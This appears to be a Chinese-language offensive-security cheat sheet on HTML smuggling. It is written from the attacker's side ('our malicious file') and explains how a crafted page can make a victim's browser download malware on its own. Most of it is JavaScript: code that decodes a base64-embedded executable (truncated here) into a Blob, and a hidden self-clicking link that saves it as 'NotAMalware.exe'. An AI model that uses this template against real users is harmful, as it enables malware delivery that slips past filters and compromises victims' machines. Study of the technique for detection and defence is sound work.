# HTML 走私 (HTML Smuggling)

## 目录 (Summary)

- [描述 (Description)](#description)
- [可执行文件存储 (Executable Storage)](#executable-storage)

## 描述 (Description)

HTML 走私 (HTML Smuggling) 是指诱导用户访问我们精心设计的 HTML 页面，该页面会自动下载我们的恶意文件。

## 可执行文件存储 (Executable Storage)

我们可以将 payload 存储在 Blob 对象中 => JavaScript: `var blob = new Blob([data], {type: 'octet/stream'});`
要执行下载，我们需要创建一个对象 URL (Object Url) => JavaScript: `var url = window.URL.createObjectURL(blob);`
有了这两个元素，我们就可以使用 JavaScript 创建一个 \<a> 标签，用于下载恶意文件：

```Javascript
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

为了存储我们的 payload，我们使用 base64 编码：

```Javascript
function base64ToArrayBuffer(base64) {
 var binary_string = window.atob(base64);
 var len = binary_string.length;
 var bytes = new Uint8Array( len );
 for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
 return bytes.buffer;
}
       
var file ='TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'NotAMalware.exe';
```
